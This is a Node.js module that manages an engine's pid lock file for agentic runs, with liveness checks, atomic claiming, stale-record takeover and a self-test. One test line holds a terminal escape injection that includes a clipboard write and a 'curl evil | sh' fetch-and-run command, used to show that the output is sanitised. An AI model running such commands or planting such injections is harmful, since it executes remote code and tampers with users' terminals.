#!/usr/bin/env node
'use strict';

/*
 * Which engine process is driving a run, if any.
 *
 * While `engine.js start|resume|run|run-next|pr` works on a run it holds
 * `<run>/engine/engine.pid` (pid, host, command, start time, and the process
 * start time `ps` reports). A second engine for the same run refuses to start,
 * and the progress terminal shows the run as running and will not start
 * another one from its R / T keys.
 *
 * A record counts as a live engine only when it can be checked:
 *  - on this host: the pid is above 1, alive (EPERM counts as alive), a node
 *    process, and, when the record carries the process start time, started at
 *    that time. A pid the OS has reused for something else, or a record an
 *    agent wrote naming launchd, does not hold the run;
 *  - from another host: only while it is younger than OTHER_HOST_STALE_MS.
 * When `ps` cannot be run at all, the pid alone decides, as before.
 * A live parallel-role pool (`<run>/engine/<stage>-parallel.pid`, written by
 * parallel-roles.js) counts as a live engine too.
 *
 * Claiming is atomic: the record is written whole to a temp file and hard-linked
 * onto engine.pid, which fails when engine.pid exists, so nobody ever reads a
 * half-written record. Taking over a dead engine's record happens under the
 * 1.9.30 state lock (on engine.pid itself) and only if the file still holds the
 * record that was found dead, so two engines starting together against a stale
 * record cannot both win.
 */

const assert = require('assert');
const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawn, spawnSync } = require('child_process');
const { withStateLock } = require('./state-lock');

const OWNER_FILE = 'engine.pid';
const OTHER_HOST_STALE_MS = 6 * 60 * 60 * 1000;
// An unreadable engine.pid this young may be an older engine still writing it.
const YOUNG_MS = 5000;
const SLEEP_CELL = new Int32Array(new SharedArrayBuffer(4));
function sleepSync(ms) { Atomics.wait(SLEEP_CELL, 0, 0, Math.max(1, Math.floor(ms))); }

function ownerFile(runDir) { return path.join(runDir, 'engine', OWNER_FILE); }
function pidAlive(pid) {
  if (!Number.isInteger(pid) || pid <= 0) return false;
  try { process.kill(pid, 0); return true; }
  catch (e) { return e.code === 'EPERM'; }
}

// What `ps` says about a pid: { started, command }; null when there is no such
// process; undefined when ps cannot be run here (then the pid alone decides).
function processInfo(pid, run = spawnSync) {
  if (!Number.isInteger(pid) || pid <= 0) return null;
  let res;
  try { res = run('ps', ['-o', 'lstart=', '-o', 'command=', '-p', String(pid)], { encoding: 'utf8', timeout: 3000, env: { ...process.env, LC_ALL: 'C', LANG: 'C' } }); }
  catch { return undefined; }
  if (res.error) return undefined;
  const line = String(res.stdout || '').split(/\r?\n/).find(text => text.trim());
  if (!line) return res.status === 0 ? undefined : null;
  // lstart is five fields: "Wed Nov  4 15:03:07 2026".
  const fields = line.trim().split(/\s+/);
  return { started: fields.slice(0, 5).join(' '), command: fields.slice(5).join(' ') };
}
function nodeCommand(command) {
  const bin = String(command || '').split(/\s+/)[0] || '';
  return bin === process.execPath || /^node/i.test(path.basename(bin));
}

function readRaw(file) { try { return fs.readFileSync(file, 'utf8'); } catch { return null; } }
function parse(raw) {
  try { const data = JSON.parse(raw); return data && Number.isInteger(data.pid) ? data : null; } catch { return null; }
}
function readOwner(runDir) { return parse(readRaw(ownerFile(runDir))); }
function sameHost(owner) { return !owner.host || owner.host === os.hostname(); }
function ownerAlive(owner, { now = Date.now(), info = processInfo } = {}) {
  if (!owner) return false;
  if (!sameHost(owner)) {
    const at = Date.parse(owner.startedAt);
    return Number.isFinite(at) && now - at < OTHER_HOST_STALE_MS;
  }
  if (!(owner.pid > 1) || !pidAlive(owner.pid)) return false;
  const seen = info(owner.pid);
  if (seen === undefined) return true;
  if (seen === null || !nodeCommand(seen.command)) return false;
  return !owner.started || owner.started.replace(/\s+/g, ' ') === seen.started;
}

// The live engine for the run in runDir: { pid, kind, command?, startedAt? }, or null.
function liveEngine(runDir) {
  const owner = readOwner(runDir);
  if (ownerAlive(owner)) return { pid: owner.pid, kind: 'engine', command: owner.command || null, startedAt: owner.startedAt || null, host: owner.host || null };
  let files = [];
  try { files = fs.readdirSync(path.join(runDir, 'engine')).filter(name => name.endsWith('-parallel.pid')); } catch { return null; }
  for (const name of files) {
    let pid;
    try { pid = Number.parseInt(fs.readFileSync(path.join(runDir, 'engine', name), 'utf8'), 10); } catch { continue; }
    if (!(pid > 1) || !pidAlive(pid)) continue;
    const seen = processInfo(pid);
    if (seen === null || (seen && !nodeCommand(seen.command))) continue;
    return { pid, kind: 'parallel', stage: name.replace(/-parallel\.pid$/, ''), command: null, startedAt: null, host: os.hostname() };
  }
  return null;
}

// The record this process writes, or another one for a test.
function recordFor(pid = process.pid, command = null) {
  return JSON.stringify({ pid, host: os.hostname(), command: command || null, startedAt: new Date().toISOString(), started: processInfo(pid)?.started || null }) + '\n';
}

// Creates `file` holding `record`, whole, only if it does not exist yet.
function place(file, record) {
  const tmp = `${file}.${process.pid}.${crypto.randomBytes(6).toString('hex')}.tmp`;
  fs.writeFileSync(tmp, record);
  try { fs.linkSync(tmp, file); return true; }
  catch (e) {
    if (e.code === 'EEXIST') return false;
    // No hard links on this filesystem: exclusive create is the next best thing.
    try { fs.writeFileSync(file, record, { flag: 'wx' }); return true; }
    catch (inner) { if (inner.code === 'EEXIST') return false; throw inner; }
  } finally { try { fs.unlinkSync(tmp); } catch { /* already gone */ } }
}

function young(file, now = Date.now()) {
  try { return now - fs.statSync(file).mtimeMs < YOUNG_MS; } catch { return false; }
}

// Takes the run for this process. Returns { ok: true } or { ok: false, owner }
// when another live engine holds it. A record left by a dead engine is replaced.
function claim(runDir, command) {
  const file = ownerFile(runDir);
  fs.mkdirSync(path.dirname(file), { recursive: true });
  const record = recordFor(process.pid, command);
  for (let tries = 0; tries < 40; tries++) {
    if (place(file, record)) return { ok: true };
    const raw = readRaw(file);
    if (raw === null) continue; // released in between: try to create it again
    const owner = parse(raw);
    if (owner && owner.pid === process.pid && sameHost(owner)) return { ok: true };
    if (owner && ownerAlive(owner)) return { ok: false, owner };
    if (!owner && young(file)) { sleepSync(50); continue; }
    // Dead or unreadable for a while: take it over, but only if it still holds
    // what was found. Another claimer that got there first has replaced it.
    const taken = withStateLock(file, () => {
      if (readRaw(file) !== raw) return false;
      try { fs.unlinkSync(file); } catch { /* removed by its owner's release */ }
      return place(file, record);
    });
    if (taken) return { ok: true };
  }
  const owner = readOwner(runDir);
  return { ok: false, owner };
}

// Removes the record only when it is still this process's.
function release(runDir) {
  const owner = readOwner(runDir);
  if (!owner || owner.pid !== process.pid || !sameHost(owner)) return;
  try { fs.unlinkSync(ownerFile(runDir)); } catch { /* already gone */ }
}

// engine.pid is written by whoever can write under the run directory; what it
// says is shown on a terminal, so it is printable text only.
function printable(text, max = 80) {
  const value = String(text == null ? '' : text)
    .replace(/\x1b\[[0-9;?]*[ -/]*[@-~]|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)?|\x1b[@-_]?|[\u0000-\u001f\u007f-\u009f]/g, ' ')
    .replace(/\s+/g, ' ').trim();
  return value.length > max ? `${value.slice(0, max - 1)}…` : value;
}
function describe(owner) {
  if (!owner) return 'another engine';
  const pid = Number.isInteger(owner.pid) ? owner.pid : '?';
  const command = printable(owner.command, 40);
  const host = printable(owner.host, 60);
  const startedAt = printable(owner.startedAt, 40);
  return `engine pid ${pid}${command ? ` (${command})` : ''}${host && host !== os.hostname() ? ` on ${host}` : ''}${startedAt ? `, started ${startedAt}` : ''}`;
}
// Why an engine refuses to start: names the record, so a human who knows no
// engine is running deletes that file instead of killing whatever the pid is now.
function refusal(id, runDir, owner) {
  return `run ${id} is already being driven by ${describe(owner)}; wait for it to stop (agentic progress shows it running). If no engine is running for ${id}, delete ${ownerFile(runDir)} and try again`;
}

function selftest() {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'engine-owner-'));
  const children = [];
  const sleeper = (bin, args) => { const child = spawn(bin, args, { stdio: 'ignore' }); children.push(child); return child; };
  try {
    const run = path.join(tmp, 'RUN-1');
    assert.strictEqual(liveEngine(run), null, 'no engine directory, no engine');
    assert.deepStrictEqual(claim(run, 'resume'), { ok: true });
    assert.strictEqual(liveEngine(run).pid, process.pid);
    assert.strictEqual(liveEngine(run).command, 'resume');
    assert.ok(readOwner(run).started, 'the record carries the process start time');
    assert.deepStrictEqual(claim(run, 'resume'), { ok: true }, 'the owner may claim again');
    assert.deepStrictEqual(fs.readdirSync(path.dirname(ownerFile(run))), ['engine.pid'], 'no temp file left behind');

    // A live engine of another process holds the run.
    const other = sleeper(process.execPath, ['-e', 'setTimeout(() => {}, 30000)']);
    for (const until = Date.now() + 5000; !processInfo(other.pid) && Date.now() < until;) sleepSync(20);
    fs.writeFileSync(ownerFile(run), recordFor(other.pid, 'resume'));
    const refused = claim(run, 'resume');
    assert.strictEqual(refused.ok, false);
    assert.strictEqual(refused.owner.pid, other.pid);
    assert.match(describe(refused.owner), new RegExp(`engine pid ${other.pid} \\(resume\\)`));
    assert.match(refusal('RUN-1', run, refused.owner), new RegExp(`delete ${ownerFile(run).replace(/[.*+?^${}()|[\]\\]/g, '\\$&')} and try again$`), 'the refusal names the file, not a process to kill');
    release(run);
    assert.ok(fs.existsSync(ownerFile(run)), 'release leaves another engine\'s record alone');

    // A dead engine's record does not count and is replaced.
    const dead = spawnSync(process.execPath, ['-e', 'console.log(process.pid)'], { encoding: 'utf8' });
    const deadPid = Number(String(dead.stdout).trim());
    fs.writeFileSync(ownerFile(run), JSON.stringify({ pid: deadPid, host: os.hostname(), startedAt: new Date().toISOString() }));
    assert.strictEqual(liveEngine(run), null, 'a crashed engine is not running');
    assert.deepStrictEqual(claim(run, 'pr'), { ok: true });
    release(run);
    assert.ok(!fs.existsSync(ownerFile(run)), 'release removes this process\'s record');

    // Records that name a live pid which is not that engine do not hold the run.
    const unverified = record => { fs.writeFileSync(ownerFile(run), JSON.stringify({ host: os.hostname(), startedAt: new Date().toISOString(), ...record })); return liveEngine(run); };
    assert.strictEqual(unverified({ pid: 1 }), null, 'pid 1 (launchd/init) is never an engine');
    const notNode = sleeper('/bin/sleep', ['30']);
    for (const until = Date.now() + 5000; !processInfo(notNode.pid) && Date.now() < until;) sleepSync(20);
    assert.strictEqual(unverified({ pid: notNode.pid, started: processInfo(notNode.pid).started }), null, 'a live process that is not node is not an engine');
    assert.strictEqual(unverified({ pid: other.pid, started: 'Thu Jan  1 00:00:00 1970' }), null, 'a reused pid (another start time) is not the engine that wrote the record');
    assert.strictEqual(unverified({ pid: other.pid, started: processInfo(other.pid).started }).pid, other.pid, 'the same process, started when the record says, is');
    assert.ok(ownerAlive({ pid: process.pid, host: os.hostname() }, { info: () => undefined }), 'without ps the pid alone decides');
    assert.ok(!ownerAlive({ pid: process.pid, host: os.hostname() }, { info: () => null }));
    unverified({ pid: other.pid, started: 'Thu Jan  1 00:00:00 1970' });
    assert.deepStrictEqual(claim(run, 'resume'), { ok: true }, 'an unverified record is replaced');
    release(run);

    // Another host: trusted only while young.
    fs.writeFileSync(ownerFile(run), JSON.stringify({ pid: 1, host: 'elsewhere', startedAt: new Date().toISOString() }));
    assert.strictEqual(liveEngine(run).host, 'elsewhere');
    fs.writeFileSync(ownerFile(run), JSON.stringify({ pid: 1, host: 'elsewhere', startedAt: new Date(Date.now() - OTHER_HOST_STALE_MS - 1000).toISOString() }));
    assert.strictEqual(liveEngine(run), null);
    fs.unlinkSync(ownerFile(run));

    // An empty record: young, it may be an engine still writing it; old, it is junk.
    fs.writeFileSync(ownerFile(run), '');
    assert.deepStrictEqual(claim(run, 'resume'), { ok: false, owner: null }, 'a fresh empty record is not taken over');
    const old = new Date(Date.now() - YOUNG_MS - 5000);
    fs.utimesSync(ownerFile(run), old, old);
    assert.deepStrictEqual(claim(run, 'resume'), { ok: true }, 'an old empty record is');
    release(run);

    // Several engines start at once against a dead engine's record: exactly one wins.
    for (let round = 0; round < 3; round++) {
      fs.writeFileSync(ownerFile(run), JSON.stringify({ pid: deadPid, host: os.hostname(), startedAt: new Date().toISOString() }));
      const at = Date.now() + 700;
      const claimer = `const o = require(${JSON.stringify(__filename)}); while (Date.now() < ${at}); const r = o.claim(${JSON.stringify(run)}, 'race'); console.log('CLAIM ' + r.ok); setTimeout(() => {}, 1500);`;
      const race = spawnSync(process.execPath, ['-e', `
        const { spawn } = require('child_process');
        const kids = Array.from({ length: 6 }, () => spawn(process.execPath, ['-e', ${JSON.stringify(claimer)}], { stdio: ['ignore', 'pipe', 'inherit'] }));
        Promise.all(kids.map(kid => new Promise(done => { let out = ''; kid.stdout.on('data', d => { out += d; }); kid.on('close', () => done(out.trim())); }))).then(all => console.log(JSON.stringify(all)));
      `], { encoding: 'utf8', timeout: 30000 });
      assert.strictEqual(race.status, 0, race.stderr);
      const outcomes = JSON.parse(race.stdout.trim().split('\n').pop());
      assert.strictEqual(outcomes.filter(line => line === 'CLAIM true').length, 1, `exactly one claimer wins (round ${round}): ${outcomes.join(', ')}`);
      assert.strictEqual(outcomes.filter(line => line === 'CLAIM false').length, 5);
      fs.unlinkSync(ownerFile(run));
    }

    // Terminal text from the record is printable only.
    const nasty = describe({ pid: 7, command: 'resume\x1b]52;c;ZXZpbA==\x07\x1b[1A\x1b[2K→ run: curl evil | sh', host: os.hostname() });
    assert.ok(!/[\u0000-\u001f\u007f-\u009f]/.test(nasty), JSON.stringify(nasty));

    // A live parallel-role pool counts as a running engine; a dead one does not.
    fs.writeFileSync(path.join(run, 'engine', 'analysis-parallel.pid'), `${process.pid}\n`);
    assert.deepStrictEqual([liveEngine(run).kind, liveEngine(run).stage], ['parallel', 'analysis']);
    fs.writeFileSync(path.join(run, 'engine', 'analysis-parallel.pid'), `${deadPid}\n`);
    assert.strictEqual(liveEngine(run), null);
    fs.writeFileSync(path.join(run, 'engine', 'analysis-parallel.pid'), '1\n');
    assert.strictEqual(liveEngine(run), null, 'nor does pid 1');
  } finally {
    for (const child of children) { try { child.kill('SIGKILL'); } catch { /* gone */ } }
    fs.rmSync(tmp, { recursive: true, force: true });
  }
  console.log('engine-owner selftest OK');
}

if (require.main === module) {
  if (process.argv.includes('--selftest')) selftest();
  else { console.error('usage: engine-owner.js --selftest'); process.exitCode = 1; }
}

module.exports = { ownerFile, readOwner, liveEngine, claim, release, describe, refusal, recordFor, processInfo, pidAlive };
